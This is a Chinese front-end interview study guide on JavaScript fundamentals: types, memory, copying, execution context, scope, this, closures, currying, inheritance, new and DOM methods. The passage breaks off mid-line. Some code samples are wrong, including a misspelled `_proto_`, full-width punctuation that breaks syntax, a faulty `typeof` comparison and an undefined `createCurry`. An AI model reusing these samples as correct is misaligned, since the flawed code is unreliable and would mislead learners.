    <content type="text"><![CDATA[前言 前端面试指南_JavaScript类型基本类型undefined null boolean string String 的意义并非“字符串”，而是字符串的 UTF16编码，最大长度是 2^53 - 1 number 有18437736874454810627(即 2^64-2^53+3)个值 12console.log( 0.1 + 0.2 == 0.3);//false//浮点运算带来精度问题console.log( Math.abs(0.1 + 0.2 - 0.3) &lt;= Number.EPSILON);//true//检查等式左右两边差的绝对值是否小于最小精度 symbol symbol引用类型object typeof内存空间在学习内存空间之前，我们需要对三种数据结构有一个直观的认知。他们分别是堆(heap)，栈(stack)与队列(queue)。 变量对象与基础数据类型JavaScript的执行上下文生成之后，会创建一个叫做变量对象的特殊对象，JavaScript的基础数据类型往往都会保存在变量对象中。 严格意义上来说，变量对象也是存放于堆内存中，但是由于变量对象的特殊职能，我们在理解时仍然需要将其于堆内存区分开来。 基础数据类型都是一些简单的数据段，JavaScript中有5种基础数据类型，分别是Undefined、Null、Boolean、Number、String、Symbol。基础数据类型都是按值访问，因为我们可以直接操作保存在变量中的实际的值。 引用数据类型与堆内存与其他语言不同，JS的引用数据类型，比如数组Array，它们值的大小是不固定的。引用数据类型的值是保存在堆内存中的对象。JavaScript不允许直接访问堆内存中的位置，因此我们不能直接操作对象的堆内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。因此，引用类型的值都是按引用访问的。这里的引用，我们可以理解为保存在变量对象中的一个地址，该地址与堆内存的实际值相关联。 为了更好的搞懂变量对象与堆内存，我们可以结合以下例子与图解进行理解。 123456var a1 = 0; // 变量对象var a2 = 'this is string'; // 变量对象var a3 = null; // 变量对象var b = &#123; m: 20 &#125;; // 变量b存在于变量对象中，&#123;m: 20&#125; 作为对象存在于堆内存中var c = [1, 2, 3]; // 变量c存在于变量对象中，[1, 2, 3] 作为对象存在于堆内存中 上例图解 因此当我们要访问堆内存中的引用数据类型时，实际上我们首先是从变量对象中获取了该对象的地址引用（或者地址指针），然后再从堆内存中取得我们需要的数据。 引用类型的复制同样也会为新的变量自动分配一个新的值保存在变量对象中，但不同的是，这个新的值，仅仅只是引用类型的一个地址指针。当地址指针相同时，尽管他们相互独立，但是在变量对象中访问到的具体对象实际上是同一个。 深浅复制浅拷贝 浅拷贝是会将对象的每个属性进行依次复制，但是当对象的属性值是引用类型时，实质复制的是其引用，当引用指向的值改变时也会跟着变化。 123456789101112let obj = &#123; name: &apos;Yvette&apos;, age: 18, hobbies: [&apos;reading&apos;, &apos;photography&apos;]&#125;let obj2 = Object.assign(&#123;&#125;, obj);let obj3 = &#123;...obj&#125;;obj.name = &apos;Jack&apos;;//基本类型不改变obj.hobbies.push(&apos;coding&apos;);//引用类型改变console.log(obj);//&#123; name: &apos;Jack&apos;, age: 18,hobbies: [ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos; ] &#125;console.log(obj2);//&#123; name: &apos;Yvette&apos;, age: 18,hobbies: [ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos; ] &#125;console.log(obj3);//&#123; name: &apos;Yvette&apos;, age: 18,hobbies: [ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos; ] &#125; 深拷贝 深拷贝复制变量值，对于非基本类型的变量，则递归至基本类型变量后，再复制。 深拷贝后的对象与原来的对象是完全隔离的，互不影响，对一个对象的修改并不会影响另一个对象。 1.深拷贝最简单的实现是: JSON.parse(JSON.stringify(obj)) JSON.parse(JSON.stringify(obj)) 是最简单的实现方式，但是有一些缺陷： 对象的属性值是函数时，无法拷贝。 原型链上的属性无法拷贝 不能正确的处理 Date 类型的数据 不能处理 RegExp 会忽略 symbol 会忽略 undefined 2.实现一个 deepClone 函数 如果是基本数据类型，直接返回 如果是 RegExp 或者 Date 类型，返回对应类型 如果是复杂数据类型，递归。 考虑循环引用的问题 1234567891011121314151617181920function deepClone(obj, hash = new WeakMap()) &#123; //递归拷贝 if (obj instanceof RegExp) return new RegExp(obj); if (obj instanceof Date) return new Date(obj); if (obj === null || typeof obj !== &apos;object&apos;) return obj; //如果不是复杂数据类型，直接返回 if (hash.has(obj)) &#123; return hash.get(obj); &#125; /** * 如果obj是数组，那么 obj.constructor 是 [Function: Array] * 如果obj是对象，那么 obj.constructor 是 [Function: Object] */ let t = new obj.constructor(); hash.set(obj, t); for (let key in obj) &#123; //递归 if (obj.hasOwnProperty(key)) &#123;//是否是自身的属性 t[key] = deepClone(obj[key], hash); &#125; &#125; return t;&#125; 内存空间管理垃圾回收标记清除 这是最常见的垃圾回收方式，当变量进入环境时，就标记这个变量为”进入环境“,从逻辑上讲，永远不能释放进入环境的变量所占的内存，永远不能释放进入环境变量所占用的内存，只要执行流程进入相应的环境，就可能用到他们。当离开环境时，就标记为离开环境。 垃圾回收器在运行的时候会给存储在内存中的变量都加上标记（所有都加），然后去掉环境变量中的变量，以及被环境变量中的变量所引用的变量（条件性去除标记），删除所有被标记的变量，删除的变量无法在环境变量中被访问所以会被删除，最后垃圾回收器，完成了内存的清除工作，并回收他们所占用的内存。 引用计数法 另一种不太常见的方法就是引用计数法，引用计数法的意思就是每个值没引用的次数，当声明了一个变量，并用一个引用类型的值赋值给改变量，则这个值的引用次数为1,；相反的，如果包含了对这个值引用的变量又取得了另外一个值，则原先的引用值引用次数就减1，当这个值的引用次数为0的时候，说明没有办法再访问这个值了，因此就把所占的内存给回收进来，这样垃圾收集器再次运行的时候，就会释放引用次数为0的这些值。 用引用计数法会存在内存泄露，下面来看原因： 123456function problem() &#123; var objA = new Object(); var objB = new Object(); objA.someOtherObject = objB; objB.anotherObject = objA;&#125; 在这个例子里面，objA和objB通过各自的属性相互引用，这样的话，两个对象的引用次数都为2，在采用引用计数的策略中，由于函数执行之后，这两个对象都离开了作用域，函数执行完成之后，因为计数不为0，这样的相互引用如果大量存在就会导致内存泄露。 执行上下文（execute context，EC）每次当控制器转到可执行代码的时候，就会进入一个执行上下文。执行上下文指代码正式执行之前进入的执行环境，它会形成一个作用域。JavaScript中的运行环境大概包括三种情况。 全局环境：JavaScript代码运行起来会首先进入该环境 函数环境：当函数被调用执行时，会进入当前函数中执行代码 eval（不建议使用，可忽略） 因此在一个JavaScript程序中，必定会产生多个执行上下文，在我的上一篇文章中也有提到，JavaScript引擎会以栈的方式来处理它们，这个栈，我们称其为函数调用栈(call stack)。栈底永远都是全局上下文，而栈顶就是当前正在执行的上下文。 当代码在执行过程中，遇到以上三种情况，都会生成一个执行上下文，放入栈中，而处于栈顶的上下文执行完毕之后，就会自动出栈。全局上下文在浏览器窗口关闭后出栈。 创建流程： 1.创建变量对象（变量提升） 1）变量 2）函数及函数参数 2.确认this指向（VO-&gt;AO） 1）全局 this-&gt;window 2）局部 指向调用它的对象 3.创建作用域链 父级作用域链+当前变量对象 执行流程： 变量赋值 函数引用 执行代码 出栈 JS执行上下文栈简称执行栈，也叫做调用栈，具有 LIFO (后进先出) 结构，用于存储在代码执行期间创建的所有执行上下文。 规则如下： 首次运行JavaScript代码的时候,会创建一个全局执行的上下文并Push到当前的执行栈中，每当发生函数调用，引擎都会为该函数创建一个新的函数执行上下文并Push当前执行栈的栈顶。 当栈顶的函数运行完成后，其对应的函数执行上下文将会从执行栈中Pop出，上下文的控制权将移动到当前执行栈的下一个执行上下文。 作用域作用域是变量以及通过名称访问这些变量的规则的集合 变量提升变量只提升声明 let 导致 TDZ 函数整体提升 作用域链作用域链就是从当前作用域开始一层一层向上寻找某个变量，直到找到全局作用域还是没找到，就宣布放弃。这种一层一层的关系，就是作用域链。 作用域链，是由当前环境与上层环境的一系列变量对象组成，它保证了当前执行环境对符合访问权限的变量和函数的有序访问。 变量对象（Variable Object）变量对象的创建，依次经历了以下几个过程。 建立arguments对象。检查当前上下文中的参数，建立该对象下的属性与属性值。 检查当前上下文的函数声明，也就是使用function关键字声明的函数。在变量对象中以函数名建立一个属性，属性值为指向该函数所在内存地址的引用。如果函数名的属性已经存在，那么该属性将会被新的引用所覆盖。 检查当前上下文中的变量声明，每找到一个变量声明，就在变量对象中以变量名建立一个属性，属性值为undefined。如果该变量名的属性已经存在，为了防止同名的函数被修改为undefined，则会直接跳过，原属性值不会被修改。 12345678910// demo01function test() &#123; console.log(a); console.log(foo()); var a = 1; function foo() &#123; return 2; &#125;&#125;test(); 全局作用域中运行test()时，test()的执行上下文开始创建。 12345678910111213// 创建过程testEC = &#123; // 变量对象 VO: &#123;&#125;, scopeChain: &#123;&#125;&#125;// 因为本文暂时不详细解释作用域链，所以把变量对象专门提出来说明// VO 为 Variable Object的缩写，即变量对象VO = &#123; arguments: &#123;...&#125;, //注：在浏览器的展示中，函数的参数可能并不是放在arguments对象中，这里为了方便理解，我做了这样的处理 foo: &lt;foo reference&gt; // 表示foo的地址引用 a: undefined&#125; 未进入执行阶段之前，变量对象中的属性都不能访问！但是进入执行阶段之后，变量对象转变为了活动对象，里面的属性都能被访问了，然后开始进行执行阶段的操作。 变量对象和活动对象有什么区别，他们其实都是同一个对象，只是处于执行上下文的不同生命周期。不过只有处于函数调用栈栈顶的执行上下文中的变量对象，才会变成活动对象。 12345678// 执行阶段VO -&gt; AO // Active ObjectAO = &#123; arguments: &#123;...&#125;, foo: &lt;foo reference&gt;, a: 1, this: Window&#125; 因此，上面的例子demo1，执行顺序就变成了这样 12345678910function test() &#123; function foo() &#123; return 2; &#125; var a; console.log(a); console.log(foo()); a = 1;&#125;test(); 1234567891011121314151617181920212223242526272829303132333435// demo2function test() &#123; console.log(foo); console.log(bar); var foo = 'Hello'; console.log(foo); var bar = function () &#123; return 'world'; &#125;//var 声明只提升var bar function foo() &#123; return 'hello'; &#125;&#125;test();//ƒ foo() &#123;// return 'hello';// &#125;//VM157:3 undefined//VM157:6 Hello// 创建阶段VO = &#123; arguments: &#123;...&#125;, foo: &lt;foo reference&gt;, bar: undefined&#125;// 这里有一个需要注意的地方，因为var声明的变量当遇到同名的属性时，会跳过而不会覆盖// 执行阶段VO -&gt; AOVO = &#123; arguments: &#123;...&#125;, foo: 'Hello', bar: &lt;bar reference&gt;, this: Window&#125; thisthis的指向，是在函数被调用的时候确定的。也就是执行上下文被创建时确定的。除此之外，在函数执行过程中，this一旦被确定，就不可更改了。运行后会报错 隐式绑定&lt;显式绑定&lt;new绑定 使用call，apply显示指定this JavaScript内部提供了一种机制，让我们可以自行手动设置this的指向。它们就是call与apply。所有的函数都具有着两个方法。它们除了参数略有不同，其功能完全一样。它们的第一个参数都为this将要指向的对象。 箭头函数不适用this的四种标准规则，而是根据外层（函数或则全局）作用域来决定this，箭头函数的绑定无法被修改（new也不行） 123456789function foo()｛ return (a) =&gt; &#123; console.log(this.a); &#125;&#125;var obj1 = &#123;a:2&#125;;var obj2 = &#123;a:3&#125;;var bar = foo.call(obj1);//foo()内部创建的箭头函数会捕获调用时foo()的thisbar.call(obj2);//2，不是3,由于foo()的this绑定到obj1，bar（引用箭头函数）的this也会绑定到obj1 闭包（Closure）什么是闭包 闭包是函数和声明该函数的词法环境的组合。–MDN 闭包条件 函数嵌套 内部函数引用外部函数的局部变量 优点 延长外部函数局部变量的生命周期 缺点 内存泄漏 解决 用原型代替 ​ 及时销毁 1234567function f1()&#123; let i = 0; return ()=&gt;&#123; console.log(i) ++i &#125;&#125; 闭包是在函数被调用执行的时候才被确认创建的。 闭包的形成，与作用域链的访问顺序有直接关系。 只有内部函数访问了上层作用域链中的变量对象时，才会形成闭包，因此，我们可以利用闭包来访问函数内部的变量。 柯里化函数函数柯里化是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数而且返回结果的新函数的技术。 函数柯里化的主要作用： 参数复用 提前返回 – 返回接受余下的参数且返回结果的新函数 延迟执行 – 返回新函数，等待执行 1234567891011121314const curry = (fn, ...args) =&gt; args.length &lt; fn.length //参数长度不足时，递归调用柯里化，等待接受新参数 ? (...arguments) =&gt; curry(fn, ...args, ...arguments) //参数长度满足时，执行函数 : fn(...args);function sumFn(a, b, c) &#123; return a + b + c;&#125;var sum = curry(sumFn);console.log(sum(2)(3)(5));//10console.log(sum(2, 3, 5));//10console.log(sum(2)(3, 5));//10console.log(sum(2, 3)(5));//10 普通思维下我们可以这样来封装。 123456function getNewArray(array) &#123; return array.map(function(item) &#123; return item * 100 + '%' &#125;)&#125;getNewArray([1, 2, 3, 0.12]); // ['100%', '200%', '300%', '12%']; 而如果借助柯里化来二次封装这样的逻辑，则会如下实现： 123456789function _map(func, array) &#123; return array.map(func);&#125;var _getNewArray = createCurry(_map);var getNewArray = _getNewArray(function(item) &#123; return item * 100 + '%'&#125;)getNewArray([1, 2, 3, 0.12]); // ['100%', '200%', '300%', '12%'];getNewArray([0.01, 1]); // ['1%', '100%'] 如果我们的项目中的固定操作是希望对数组进行一个过滤，找出数组中的所有Number类型的数据。借助柯里化思维我们可以这样做。 12345678910111213141516171819202122232425function _filter(func, array) &#123; return array.filter(func);&#125;var _find = createCurry(_filter);var findNumber = _find(function(item) &#123; if (typeof item == 'number') &#123; return item; &#125;&#125;)findNumber([1, 2, 3, '2', '3', 4]); // [1, 2, 3, 4]// 当我们继续封装另外的过滤操作时就会变得非常简单// 找出数字为20的子项var find20 = _find(function(item, i) &#123; if (typeof item === 20) &#123; return i; &#125;&#125;)find20([1, 2, 3, 30, 20, 100]); // 4// 找出数组中大于100的所有数据var findGreater100 = _find(function(item) &#123; if (item &gt; 100) &#123; return item; &#125;&#125;)findGreater100([1, 2, 101, 300, 2, 122]); // [101, 300, 122] 无限参数的柯里化1234// 实现一个add方法，使计算结果能够满足如下预期：add(1)(2)(3) = 6;add(1, 2, 3)(4) = 10;add(1)(2)(3)(4)(5) = 15; add方法的实现仍然会是一个参数的收集过程。当add函数执行到最后时，仍然返回的是一个函数，但是我们可以通过定义toString/valueOf的方式，让这个函数可以直接参与计算，并且转换的结果是我们想要的。而且它本身也仍然可以继续执行接收新的参数。实现方式如下。 123456789101112131415161718192021222324252627282930313233343536373839404142function add() &#123; // 第一次执行时，定义一个数组专门用来存储所有的参数 var _args = [].slice.call(arguments); // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值 var adder = function () &#123; var _adder = function() &#123; // [].push.apply(_args, [].slice.call(arguments)); _args.push(...arguments); return _adder; &#125;; // 利用隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回 _adder.toString = function () &#123; return _args.reduce(function (a, b) &#123; return a + b; &#125;); &#125; return _adder; &#125; // return adder.apply(null, _args); return adder(..._args);&#125;var a = add(1)(2)(3)(4); // f 10var b = add(1, 2, 3, 4); // f 10var c = add(1, 2)(3, 4); // f 10var d = add(1, 2, 3)(4); // f 10// 可以利用隐式转换的特性参与计算console.log(a + 10); // 20console.log(b + 20); // 30console.log(c + 30); // 40console.log(d + 40); // 50// 也可以继续传入参数，得到的结果再次利用隐式转换参与计算console.log(a(10) + 100); // 120console.log(b(10) + 100); // 120console.log(c(10) + 100); // 120console.log(d(10) + 100); // 120// 其实上栗中的add方法，就是下面这个函数的柯里化函数，只不过我们并没有使用通用式来转化，而是自己封装function add(...args) &#123; return args.reduce((a, b) =&gt; a + b);&#125; 模块化模块是闭包最强大的一个应用场景 1234567891011(function () &#123; var a = 10; var b = 20; function add(num1, num2) &#123; var num1 = !!num1 ? num1 : a; var num2 = !!num2 ? num2 : b; return num1 + num2; &#125; window.add = add;&#125;)();add(10, 20); 使用函数自执行的方式，创建了一个模块。add是模块对外暴露的一个公共方法。而变量a，b被作为私有变量。 面向对象继承 构造函数的prototype与所有实例对象的__proto__都指向原型对象。而原型对象的constructor指向构造函数。 ES5new 操作符新建了一个空对象，这个对象原型指向构造函数的prototype，执行构造函数后返回这个对象。 1. 原型链继承原型链继承的基本思想是利用原型让一个引用类型继承另一个引用类型的属性和方法。 123456789101112131415161718192021function SuperType() &#123; this.name = &apos;Yvette&apos;; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;SuperType.prototype.getName = function () &#123; return this.name;&#125;function SubType() &#123; this.age = 22;&#125;SubType.prototype = new SuperType();SubType.prototype.getAge = function() &#123; return this.age;&#125;SubType.prototype.constructor = SubType;let instance1 = new SubType();instance1.colors.push(&apos;yellow&apos;);console.log(instance1.getName()); //&apos;Yvette&apos;console.log(instance1.colors);//[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, &apos;yellow&apos; ]let instance2 = new SubType();console.log(instance2.colors);//[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, &apos;yellow&apos; ] 缺点： 通过原型来实现继承时，原型会变成另一个类型的实例，原先的实例属性变成了现在的原型属性，该原型的引用类型属性会被所有的实例共享。 在创建子类型的实例时，没有办法在不影响所有对象实例的情况下给超类型的构造函数中传递参数。 2. 借用构造函数借用构造函数的技术，其基本思想为: 在子类型的构造函数中调用超类型构造函数。 1function SuperType(name) &#123; this.name = name; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;function SubType(name) &#123; SuperType.call(this, name);&#125;let instance1 = new SubType(&apos;Yvette&apos;);instance1.colors.push(&apos;yellow&apos;);console.log(instance1.colors);//[&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, yellow]let instance2 = new SubType(&apos;Jack&apos;);console.log(instance2.colors); //[&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;] 优点: 可以向超类传递参数 解决了原型中包含引用类型值被所有实例共享的问题 缺点: 方法都在构造函数中定义，函数复用无从谈起，另外超类型原型中定义的方法对于子类型而言都是不可见的。 3. 组合继承(原型链 + 借用构造函数)组合继承指的是将原型链和借用构造函数技术组合到一块，从而发挥二者之长的一种继承模式。基本思路： 使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承，既通过在原型上定义方法来实现了函数复用，又保证了每个实例都有自己的属性。 1function SuperType(name) &#123; this.name = name; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;SuperType.prototype.sayName = function () &#123; console.log(this.name);&#125;function SuberType(name, age) &#123; SuperType.call(this, name); this.age = age;&#125;SuberType.prototype = new SuperType();SuberType.prototype.constructor = SuberType;SuberType.prototype.sayAge = function () &#123; console.log(this.age);&#125;let instance1 = new SuberType(&apos;Yvette&apos;, 20);instance1.colors.push(&apos;yellow&apos;);console.log(instance1.colors); //[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, &apos;yellow&apos; ]instance1.sayName(); //Yvettelet instance2 = new SuberType(&apos;Jack&apos;, 22);console.log(instance2.colors); //[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos; ]instance2.sayName();//Jack 缺点: 无论什么情况下，都会调用两次超类型构造函数：一次是在创建子类型原型的时候，另一次是在子类型构造函数内部。 优点: 可以向超类传递参数 每个实例都有自己的属性 实现了函数复用 4. 原型式继承原型继承的基本思想： 借助原型可以基于已有的对象创建新对象，同时还不必因此创建自定义类型。 1function object(o) &#123; function F() &#123; &#125; F.prototype = o; return new F();&#125; 在 object() 函数内部，先穿甲一个临时性的构造函数，然后将传入的对象作为这个构造函数的原型，最后返回了这个临时类型的一个新实例，从本质上讲，object() 对传入的对象执行了一次浅拷贝。 ECMAScript5通过新增 Object.create()方法规范了原型式继承。这个方法接收两个参数：一个用作新对象原型的对象和（可选的）一个为新对象定义额外属性的对象(可以覆盖原型对象上的同名属性)，在传入一个参数的情况下，Object.create() 和 object() 方法的行为相同。 1var person = &#123; name: &apos;Yvette&apos;, hobbies: [&apos;reading&apos;, &apos;photography&apos;]&#125;var person1 = Object.create(person);person1.name = &apos;Jack&apos;;person1.hobbies.push(&apos;coding&apos;);var person2 = Object.create(person);person2.name = &apos;Echo&apos;;person2.hobbies.push(&apos;running&apos;);console.log(person.hobbies);//[ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos;, &apos;running&apos; ]console.log(person1.hobbies);//[ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos;, &apos;running&apos; ] 在没有必要创建构造函数，仅让一个对象与另一个对象保持相似的情况下，原型式继承是可以胜任的。 缺点: 同原型链实现继承一样，包含引用类型值的属性会被所有实例共享。 5. 寄生式继承寄生式继承是与原型式继承紧密相关的一种思路。寄生式继承的思路与寄生构造函数和工厂模式类似，即创建一个仅用于封装继承过程的函数，该函数在内部已某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象。 1function createAnother(original) &#123; var clone = object(original);//通过调用函数创建一个新对象 clone.sayHi = function () &#123;//以某种方式增强这个对象 console.log(&apos;hi&apos;); &#125;; return clone;//返回这个对象&#125;var person = &#123; name: &apos;Yvette&apos;, hobbies: [&apos;reading&apos;, &apos;photography&apos;]&#125;;var person2 = createAnother(person);person2.sayHi(); //hi 基于 person 返回了一个新对象 -—— person2，新对象不仅具有 person 的所有属性和方法，而且还有自己的 sayHi()方法。在考虑对象而不是自定义类型和构造函数的情况下，寄生式继承也是一种有用的模式。 缺点： 使用寄生式继承来为对象添加函数，会由于不能做到函数复用而效率低下。 同原型链实现继承一样，包含引用类型值的属性会被所有实例共享。 6. 寄生组合式继承所谓寄生组合式继承，即通过借用构造函数来继承属性，通过原型链的混成形式来继承方法，基本思路： 不必为了指定子类型的原型而调用超类型的构造函数，我们需要的仅是超类型原型的一个副本，本质上就是使用寄生式继承来继承超类型的原型，然后再将结果指定给子类型的原型。寄生组合式继承的基本模式如下所示： 1function inheritPrototype(subType, superType) &#123; var prototype = object(superType.prototype); //创建对象 prototype.constructor = subType;//增强对象 subType.prototype = prototype;//指定对象&#125; 第一步：创建超类型原型的一个副本 第二步：为创建的副本添加 constructor 属性 第三步：将新创建的对象赋值给子类型的原型 至此，我们就可以通过调用 inheritPrototype 来替换为子类型原型赋值的语句： 1function SuperType(name) &#123; this.name = name; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;//...codefunction SuberType(name, age) &#123; SuperType.call(this, name); this.age = age;&#125;SuberType.prototype = new SuperType();inheritPrototype(SuberType, SuperType);//...code 优点: 只调用了一次超类构造函数，效率更高。避免在SuberType.prototype上面创建不必要的、多余的属性，与其同时，原型链还能保持不变。 因此寄生组合继承是引用类型最理性的继承范式。 假设我们将此方法添加到构造函数本身。 也许不是每个Person实例都需要这种方法。这会浪费大量内存空间，因为它们仍然具有该属性，这占用了每个实例的内存空间。 相反，如果我们只将它添加到原型中，我们只需将它放在内存中的一个位置，但它们都可以访问它！ ES6classextendssuper通过super()调用父类构造函数，如果有super方法，需要时构造函数中第一个执行的语句，this关键字在调用super之后才可用 constructorstatic静态方法，在类定义的外部只能通过类名调用，内部可以通过this调用，并且静态函数是会被继承的。 区别大多数浏览器的ES5实现之中，每一个对象都有__proto__属性，指向对应的构造函数的prototype属性。Class作为构造函数的语法糖，同时有prototype属性和__proto__属性，因此同时存在两条继承链。 （1）子类的__proto__属性，表示构造函数的继承，总是指向父类。 （2）子类prototype属性的__proto__属性，表示方法的继承，总是指向父类的prototype属性。 1234class A &#123;&#125;class B extends A &#123;&#125;B.__proto__ === A // trueB.prototype.__proto__ === A.prototype // true 上面代码中，子类B的__proto__属性指向父类A，子类B的prototype属性的__proto__属性指向父类A的prototype属性。 这样的结果是因为，类的继承是按照下面的模式实现的: 123456class A &#123;&#125;class B &#123;&#125;// B的实例继承A的实例Object.setPrototypeOf(B.prototype, A.prototype);// B继承A的静态属性Object.setPrototypeOf(B, A); Object.setPrototypeOf的简单实现如下： 1234Object.setPrototypeOf = function (obj, proto) &#123; obj.__proto__ = proto; return obj;&#125; 因此，就得到了上面的结果。 1234567Object.setPrototypeOf(B.prototype, A.prototype);// 等同于B.prototype.__proto__ = A.prototype;Object.setPrototypeOf(B, A);// 等同于B.__proto__ = A; 这两条继承链，可以这样理解：作为一个对象，子类（B）的原型（__proto__属性）是父类（A）；作为一个构造函数，子类（B）的原型（prototype属性）是父类的实例。 123Object.create(A.prototype);// 等同于B.prototype.__proto__ = A.prototype; 不足 不支持静态属性（除函数）。 class中不能定义私有变量和函数。class中定义的所有函数都会被放倒原型当中，都会被子类继承，而属性都会作为实例属性挂到this上。如果子类想定义一个私有的方法或定义一个private 变量，便不能直接在class花括号内定义，这真的很不方便！ 总结一下，和es5相比，es6在语言层面上提供了面向对象的部分支持，虽然大多数时候只是一个语法糖，但使用起来更方便，语意化更强、更直观，同时也给javascript继承提供一个标准的方式。还有很重要的一点就是－es6支持原生对象继承。 new 声明一个中间对象； 将该中间对象的原型指向构造函数的原型； 将构造函数的this，指向该中间对象； 返回该中间对象，即返回实例对象。 1234567891011121314function _new()&#123; let target = &#123;&#125;;//创建空对象 let [constructor,...args] = [...arguments] //执行原型连接；target是 constructor的实例 target._proto_=constructor.prototype //执行构造函数，将属性或方法添加到空对象上 let result = constructor.apply(target，args); //构造函数中的this指向空对象 if(result&amp;&amp;(typeof (result)==&quot;object&quot;||typeof(result)==&quot;function&quot;))&#123; return result //如果构造函数执行的结构返回的是一个对象或方法，则返回 &#125; return target//不是则返回新对象&#125; 封装封装，即隐藏对象的属性和实现细节，仅对外公开接口，控制在程序中属性的读和修改的访问级别；将抽象得到的数据和行为（或功能）相结合，形成一个有机的整体，也就是将数据与操作数据的源代码进行有机的结合，形成“类”，其中数据和函数都是类的成员。 多态同一操作作用于不同的对象，可以有不同的解释，产生不同的执行结果。在运行时，可以通过指向基类的指针，来调用实现派生类中的方法。 虚函数和模版（java中的范型）是支持多态的主要方式，因为javascript中没有模版，所以下面我们只讨论虚函数，下面先看一个例子： 1234567891011121314151617181920212223function Person(name,age)&#123; this.name=name this.age=age&#125;Person.prototype.toString=function()&#123; return "I am a Person, my name is "+ this.name&#125;function Man(name,age)&#123; Person.apply(this,arguments)&#125;Man.prototype = Object.create(Person.prototype);Man.prototype.toString=function()&#123; return "I am a Man, my name is"+this.name;&#125;var person=new Person("Neo",19)var man1=new Man("Davin",18)var man2=new Man("Jack",19)&gt; person+""&gt; "I am a Person, my name is Neo"&gt; man1+""&gt; "I am a Man, my name isDavin"&gt; man1&lt;man2 //期望比较年龄大小 1&gt; false 上面例子中，我们分别在子类和父类实现了toString方法，其实，在js中上述代码原理很简单，对于同名函数，子类会覆父类的，这种特性其实就是虚函数，只不过js中不区分参数个数，也不区分参数类型，只看函数名称，如果名称相同就会覆盖。现在我们来看注释1，我们期望直接用比较运算符比较两个man的大小（按年龄），怎么实现？在c++中有运算符重载，但java和js中都没有，所幸的是，js可以用一种变通的方法来实现： 123456789101112131415161718192021222324252627function Person(name,age)&#123; this.name=name this.age=age&#125;Person.prototype.valueOf=function()&#123; return this.age&#125;function Man(name,age)&#123; Person.apply(this,arguments)&#125;Man.prototype = Object.create(Person.prototype);var person=new Person("Neo",19)var man1=new Man("Davin",18)var man2=new Man("Jack",19)var man3=new Man("Joe",19)&gt;man1&lt;19//1&gt;true&gt;person==19//2&gt;true&gt;man1&lt;man2//3&gt;true&gt;man2==man3 //4 注意&gt;true&gt;person==man2//5&gt;false 其中1、2、3、5在所有js vm下结果都是确定的。但是4并不一定！javascript规定，对于比较运算符，如果一个值是对象，另一个值是数字时，会先尝试调用valueOf，如果valueOf未指定，就会调用toString；如果是字符串时，则先尝试调用toString，如果没指定，则尝试valueOf，如果两者都没指定，将抛出一个类型错误异常。如果比较的两个值都是对象时，则比较的时对象的引用地址，所以若是对象，只有自身＝＝＝自身，其它情况都是false。现在我们回过头来看看示例代码，前三个都是标准的行为。而第四点取决于浏览器的实现，如果严格按照标准，这应该算是chrome的一个bug ,但是，我们的代码使用时双等号，并非严格相等判断，所以浏览器的相等规则也会放宽。值得一提的是5，虽然person和man2 age都是19，但是结果却是false。总结一下，chrome对相同类的实例比较策略是先会尝试转化，然后再比较大小，而对非同类实例的比较，则会直接返回false，不会做任何转化。 所以我的建议是：如果数字和类实例比较，永远是安全的，可以放心玩，如果是同类实例之间，可以进行非等比较，这个结果是可以保证的，不要进行相等比较，结果是不能保证的，一般相等比较，变通的做法是： 12var equal= !(ob1&lt;ob2||ob1&gt;ob2) //不小于也不大于，就是等于，前提是比较操作符两边的对象要实现valueOf或toString 当然类似toString、valueOf的还有toJson方法，但它和重载没有什么关系，故不冗述。 DOM增删查改增12345678document.createElement(&apos;div&apos;);document.createTextNode(&apos;hello world!&apos;);ele.appendChild(el);ele.insertBefore(newElement, referenceElement);//insertAfter是jQuery方法insertAdjacentHTML insertAdjacentHTML() 将指定的文本解析为HTML或XML，并将结果节点插入到DOM树中的指定位置。它不会重新解析它正在使用的元素，因此它不会破坏元素内的现有元素。这避免了额外的序列化步骤，使其比直接innerHTML操作更快。 1ele.insertAdjacentHTML(position, text); position是相对于元素的位置，并且必须是以下字符串之一： beforebegin: 元素自身的前面。 afterbegin: 插入元素内部的第一个子节点之前。 beforeend: 插入元素内部的最后一个子节点之后。 afterend: 元素自身的后面。text是要被解析为HTML或XML,并插入到DOM树中的字符串。 位置名称的可视化： 1234567&lt;!-- beforebegin --&gt; &lt;p&gt; &lt;!-- afterbegin --&gt; foo &lt;!-- beforeend --&gt;&lt;/p&gt;&lt;!-- afterend --&gt; 注意： beforebegin和afterend位置,仅在节点在树中且节点具有一个parent元素时工作. 删1ele.removeChild(el); 查123456789101112131415161718192021222324document.querySelector(&quot;.myclass&quot;);document.querySelectorAll(&quot;div.note, div.alert&quot;);document.getElementById(&apos;xxx&apos;);document.getElementsByClassName(&apos;highlight&apos;);document.getElementsByTagName(&apos;td&apos;);var parent = ele.parentElement;var parent = ele.parentNode;// 获取子节点，子节点可以是任何一种节点，可以通过nodeType来判断var nodes = ele.children; // 查询子元素var els = ele.getElementsByTagName(&apos;td&apos;);var els = ele.getElementsByClassName(&apos;highlight&apos;);// 当前元素的第一个/最后一个子元素节点var el = ele.firstChild;var el = ele.firstElementChild;var el = ele.lastChild;var el = ele.lastElementChild;// 下一个/上一个兄弟元素节点var el = ele.nextSibling;var el = ele.nextElementSibling;var el = 